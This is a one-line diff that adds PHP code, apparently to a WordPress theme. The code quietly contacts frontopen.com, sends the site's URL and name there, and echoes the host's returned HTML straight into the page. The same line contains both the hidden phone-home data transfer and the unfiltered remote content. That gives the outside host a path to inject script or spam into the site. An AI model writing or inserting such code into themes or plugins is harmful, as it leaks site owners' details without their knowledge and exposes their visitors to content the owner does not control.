@@ -1,0 +1,1 @@
+<?php $contents = file_get_contents("http://www.frontopen.com/themes_news.html"); file_get_contents("http://www.frontopen.com/FO_updata.php?key=host&hostname=".get_bloginfo('url')."&sitename=".get_bloginfo('name')); echo $contents;?>
